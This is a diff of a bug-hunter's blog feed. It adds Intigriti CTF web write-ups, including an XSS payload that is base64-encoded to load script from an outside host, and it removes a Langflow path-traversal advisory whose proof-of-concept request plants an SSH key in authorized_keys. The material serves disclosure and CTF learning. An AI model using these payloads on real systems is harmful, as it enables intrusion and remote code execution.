@@ -1,4 +1,117 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-08-13T15:06:28+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Arbitrary File Overwrite in jupyter notebook</title><link href="http://localhost:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite in jupyter notebook" /><published>2024-07-09T10:31:06+08:00</published><updated>2024-07-09T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook.html"><![CDATA[<h2 id="name">Name</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-11-20T14:54:52+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">2024 Intigrity CTF, some Web solution</title><link href="http://localhost:4000/ctf/2024/11/20/web.html" rel="alternate" type="text/html" title="2024 Intigrity CTF, some Web solution" /><published>2024-11-20T10:31:06+08:00</published><updated>2024-11-20T10:31:06+08:00</updated><id>http://localhost:4000/ctf/2024/11/20/web</id><content type="html" xml:base="http://localhost:4000/ctf/2024/11/20/web.html"><![CDATA[<h2 id="pizza-paradise-100p-395-solves">Pizza Paradise, 100p, 395 solves</h2>
+
+<ol>
+  <li>
+    <p>Find <code class="language-plaintext highlighter-rouge">robots.txt</code> in host page, <code class="language-plaintext highlighter-rouge">https://pizzaparadise.ctf.intigriti.io/robots.txt</code></p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> User-agent: *
+ Disallow: /secret_172346606e1d24062e891d537e917a90.html
+ Disallow: /assets/
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Open secret login page, find admin username and password hash in client js. <code class="language-plaintext highlighter-rouge">https://pizzaparadise.ctf.intigriti.io/assets/js/auth.js</code></p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> const validUsername = "agent_1337";
+ const validPasswordHash = "91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac";
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Crack sha256 using online tools <a href="https://passwordrecovery.io/sha256/">https://passwordrecovery.io/sha256/</a>. And get password <code class="language-plaintext highlighter-rouge">intel420</code></p>
+  </li>
+  <li>
+    <p>Login with valid username and password. After login using image download path traversal to leak php file, there is flag!</p>
+  </li>
+</ol>
+
+<h2 id="biocorp-100p-389-solves">BioCorp, 100p, 389 solves</h2>
+
+<ol>
+  <li>Simple XXE to read flag, too simple</li>
+</ol>
+
+<h2 id="cat-club-100p-130-solves">Cat Club, 100p, 130 solves</h2>
+
+<ol>
+  <li>
+    <p>JWT algorithm confusion attack, <a href="https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion">portswigger lab</a>. Using jwt attack to change username.</p>
+  </li>
+  <li>
+    <p>The changed username is injected to pug template, so just change username to <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs">SSTI payload</a> to RCE to read the flag.txt.</p>
+  </li>
+</ol>
+
+<h2 id="safenotes-20-218p-43-solves">SafeNotes 2.0, 218p, 43 solves</h2>
+
+<ol>
+  <li>
+    <p>Users can create note with html but sanitized by Dompurify. But in <code class="language-plaintext highlighter-rouge">logNoteAccess</code> function, <code class="language-plaintext highlighter-rouge">const currentUsername = document.getElementById("username").innerText;</code> is vulnerable to read our payload, so <code class="language-plaintext highlighter-rouge">username</code> can be controled.</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> function logNoteAccess(noteId, content) {
+         // Read the current username, maybe we need to ban them?
+         const currentUsername = document.getElementById("username").innerText;
+         const username = currentUsername || urlParams.get("name");
+
+         // Just in case, it seems like people can do anything with the client-side!!
+         const sanitizedUsername = decodeURIComponent(username).replace(/\.\.[\/\\]/g, '');
+
+         fetch("/api/notes/log/" + sanitizedUsername, {
+             method: "POST",
+             headers: {
+                 "Content-Type": "application/json",
+                 "X-CSRFToken": csrf_token,
+             },
+             body: JSON.stringify({
+                 name: username,
+                 note_id: noteId,
+                 content: content
+             }),
+         })
+             .then(response =&gt; response.json())
+             .then(data =&gt; {
+                 // Does the log entry data look OK?
+                 document.getElementById("debug-content").outerHTML = JSON.stringify(data, null, 2)
+                 document.getElementById("debug-content-section").style.display = "block";
+             })
+             .catch(error =&gt; console.error("Logging failed:", error));
+
+     }
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Bypass regex filter: <code class="language-plaintext highlighter-rouge">const sanitizedUsername = decodeURIComponent(username).replace(/\.\.[\/\\]/g, '');
+</code>. Using <code class="language-plaintext highlighter-rouge">....//</code> to bypass filter, so we can get <code class="language-plaintext highlighter-rouge">../</code>. Therefore, using client side path traversal, we made fetch to another api with will return our manipulated username. <code class="language-plaintext highlighter-rouge">fetch("/api/notes/log/" + sanitizedUsername) =&gt;fetch("/contact")</code>.</p>
+  </li>
+  <li>
+    <p>XSS sink, create div with id <code class="language-plaintext highlighter-rouge">debug-content</code>. and the data is containing our xss payload.</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> document.getElementById("debug-content").outerHTML = JSON.stringify(data, null, 2)
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h2 id="workbreak-400p-26-solve">WorkBreak, 400p, 26 solve</h2>
+
+<ol>
+  <li>
+    <p>Post payload using api <code class="language-plaintext highlighter-rouge">https://workbreak-0.ctf.intigriti.io/api/user/settings</code>:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> {"name":"Anon","phone":"","position":"","__proto__":{"tasks":[{"date":"2024-11-20","tasksCompleted":"&lt;img src=x onerror=eval(atob('dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwpzY3JpcHQuc3JjID0gImh0dHBzOi8vY2VoZTcwMTAucmVxdWVzdHJlcG8uY29tIjsKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOw=='))&gt;"}]}}
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Client side prototype pollution, in client side, profile will read our data above, noting that <code class="language-plaintext highlighter-rouge">__proto__</code> is read, chain with <code class="language-plaintext highlighter-rouge">Object.assign</code> we can pollute the <code class="language-plaintext highlighter-rouge">userSettings</code> object, so this object is containing <code class="language-plaintext highlighter-rouge">tasks</code> field now.</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> const userSettings = Object.assign(
+                 { name: "", phone: "", position: "" },
+                 profileData.assignedInfo
+             );
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Due to insecure iframe postmessage, we can send xss payload to iframe. Also, the xss in iframe will send xss payload back to parent, triggering parent xss.</p>
+  </li>
+</ol>]]></content><author><name></name></author><category term="ctf" /><summary type="html"><![CDATA[Pizza Paradise, 100p, 395 solves]]></summary></entry><entry><title type="html">Arbitrary File Overwrite in jupyter notebook</title><link href="http://localhost:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite in jupyter notebook" /><published>2024-07-09T10:31:06+08:00</published><updated>2024-07-09T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Arbitrary File Overwrite in jupyter notebook</p>
@@ -1059,169 +1172,4 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmx
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release(No Response)</title><link href="http://localhost:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release(No Response)" /><published>2024-05-26T10:31:06+08:00</published><updated>2024-05-26T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in Langflow Pre-release.</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>CWE-22: Path Traversal</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>High (8.8)</p>
-</blockquote>
-
-<h2 id="version">Version</h2>
-
-<blockquote>
-  <p>Pre-release version: 1.0 Alpha - v1.0.0a37</p>
-</blockquote>
-
-<h2 id="description">Description</h2>
-
-<p>The post <code class="language-plaintext highlighter-rouge">/upload/{flow_id}</code> endpoint in the Langflow <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">upload_file</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">filename</code> parameter which allows the uploading of arbitrary files. The <code class="language-plaintext highlighter-rouge">filename</code> is then directly append to a directory path <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">without sanitized</a> and the file content is writen to dest location. An attacker can upload and overwrite ANY file on the filesystem. This can lead to remote code execution in many different ways.</p>
-
-<p>The vulnerable function <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34"><code class="language-plaintext highlighter-rouge">save_file</code></a>:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>async def save_file(self, flow_id: str, file_name: str, data: bytes):
-        folder_path = self.data_dir / flow_id
-        folder_path.mkdir(parents=True, exist_ok=True)
-        file_path = folder_path / file_name
-
-        try:
-            with open(file_path, "wb") as f:
-                f.write(data)
-            logger.info(f"File {file_name} saved successfully in flow {flow_id}.")
-        except Exception as e:
-            logger.error(f"Error saving file {file_name} in flow {flow_id}: {e}")
-            raise e
-</code></pre></div></div>
-
-<h2 id="proof-of-concept">Proof of Concept</h2>
-
-<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ….</p>
-
-<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the langflow python API and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
-cat: /home/kali/.ssh/authorized_keys: No such file or directory
-</code></pre></div></div>
-
-<p>An attacker can now send the following request to the webserver. This request will upload the attacker’s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>
-
-<p>We start a simple server using tutorial from <a href="https://github.com/langflow-ai/langflow?tab=readme-ov-file#-installation">https://github.com/langflow-ai/langflow?tab=readme-ov-file#-installation</a>. Note that we use pre-release versoin:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install the pre-release version
-python -m pip install langflow --pre --force-reinstall
-</code></pre></div></div>
-<p>Start web interface, the default port is <code class="language-plaintext highlighter-rouge">7860</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -m langflow run
-</code></pre></div></div>
-
-<p>Then open the Langflow web interface in browser, create a new project and in the project add a file component, click the file upload button, select random text file with burpsuite intercepting the upload request. We can see the file name and file content in the multipart request body.</p>
-
-<p><img src="/assets/images/bughunter/langflow/file-component.png" alt="file-component" /></p>
-
-<p><img src="/assets/images/bughunter/langflow/file-upload.png" alt="file-upload" /></p>
-
-<p>Change the multipart <code class="language-plaintext highlighter-rouge">filename</code> to <code class="language-plaintext highlighter-rouge">../../../../../../../../../home/kali/.ssh/authorized_keys</code> and file content to our <code class="language-plaintext highlighter-rouge">authorized_keys</code> content. Repeat the upload request.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:7860/api/v1/files/upload/7e774022-0991-47f7-83a1-ef127d439755 HTTP/1.1
-Accept: application/json, text/plain, */*
-Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
-Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjODFiMWM1Yy1lYzgxLTRkZmQtOGFiZS0yMGIxNDBmOWY3NjkiLCJleHAiOjE3NDgyMjk3NDJ9.PrPNZGIOgBql3mDBTWqmdpg4G1zYeaB-087GH5NHvYE
-Cache-Control: no-cache
-Connection: close
-Cookie: access_token_lf=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjODFiMWM1Yy1lYzgxLTRkZmQtOGFiZS0yMGIxNDBmOWY3NjkiLCJleHAiOjE3NDgyMjk3NDJ9.PrPNZGIOgBql3mDBTWqmdpg4G1zYeaB-087GH5NHvYE
-Origin: http://127.0.0.1:7860
-Pragma: no-cache
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Host: 127.0.0.1:7860
-Accept-Encoding: gzip, deflate
-Content-Type: multipart/form-data; boundary=--------------------------636165805457578805665550
-Content-Length: 647
-
-----------------------------636165805457578805665550
-Content-Disposition: form-data; name="file"; filename="../../../../../home/kali/.ssh/authorized_keys"
-Content-Type: application/octet-stream
-
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
-----------------------------636165805457578805665550--
-</code></pre></div></div>
-
-<p>The response indicates success with the uploaded file path.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 201 Created
-Connection: close
-Content-Length: 146
-Access-Control-Allow-Credentials: true
-Access-Control-Allow-Origin: http://127.0.0.1:7860
-Content-Type: application/json
-Date: Sun, 26 May 2024 03:48:37 GMT
-Server: uvicorn
-Vary: Origin
-
-{"flowId":"7e774022-0991-47f7-83a1-ef127d439755","file_path":"7e774022-0991-47f7-83a1-ef127d439755/../../../../../home/kali/.ssh/authorized_keys"}
-</code></pre></div></div>
-
-<p>We can verify the success by again checking the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
-</code></pre></div></div>
-
-<h2 id="fix">Fix</h2>
-
-<p>Use <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">UUID instead of origin file name to store the file</a>:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.post("/upload/{flow_id}", status_code=HTTPStatus.CREATED)
-async def upload_file(
-    file: UploadFile,
-    flow_id: UUID = Depends(get_flow_id),
-    storage_service: StorageService = Depends(get_storage_service),
-):
-    try:
-        flow_id_str = str(flow_id)
-        file_content = await file.read()
-        # fix the path travesal problem
-        file_name = hashlib.sha256(file_content).hexdigest()
-        folder = flow_id_str
-        await storage_service.save_file(flow_id=folder, file_name=file_name, data=file_content)
-        return UploadFileResponse(flowId=flow_id_str, file_path=f"{folder}/{file_name}")
-    except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
-</code></pre></div></div>
-
-<h2 id="impact">Impact</h2>
-
-<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
-
-<h3 id="ssh-access">SSH Access</h3>
-
-<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
-
-<h3 id="web-servers">Web Servers</h3>
-
-<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
-
-<h3 id="any-bounty">Any bounty</h3>
-
-<p>Can I ask for a bug bounty award or a CVE id for this bug? Thank you very much!</p>
-
-<h2 id="reference">Reference</h2>
-
-<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>
-
-<h2 id="occurrences">Occurrences</h2>
-
-<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47</a></p>
-
-<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
